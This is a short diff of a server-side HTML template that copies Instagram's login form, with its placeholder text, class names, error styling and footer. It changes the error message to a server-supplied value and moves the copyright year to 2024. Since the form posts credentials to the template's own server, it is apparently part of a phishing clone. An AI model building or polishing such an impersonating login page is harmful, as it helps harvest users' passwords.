@@ -20,16 +20,16 @@
                 <div class="form-wrap">
                   <form class="form" method="post">
                     <div class="input-box">
-                      <input type="text" id="name" name="username" placeholder="Phone number, username, or email" required>
+                      <input type="text" name="username" placeholder="Phone number, username, or email" required>
                     </div>  
                     <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" required>
+                      <input type="password" name="password" placeholder="Password" required>
                     </div>  
                     <span class="button-box">
                       <button class="btn" type="submit" name="submit">Log in</button>
                     </span>  
                     {% if error %}
-                    <div class="_ab2z" style="color: #ED4956; font: 14px-apple-system, BlinkMacSystemFont, sans-serif; margin: 10px 40px;">Sorry, your password was incorrect. Please double-check your password.</div>
+                    <div class="_ab2z" style="color: #ED4956; font: 14px-apple-system, BlinkMacSystemFont, sans-serif; margin: 10px 40px;">{{ error }}</div>
                     {% endif %}
                     <a class="forgot" href="">Forgot password?</a>
                   </form>
@@ -75,7 +75,7 @@
               </li>
             </ul>
           </nav>
-          <span class="footer-logo">&copy; 2018 Instagram</span>
+          <span class="footer-logo">&copy; 2024 Instagram</span>
         </div>
       </footer>
     </section>
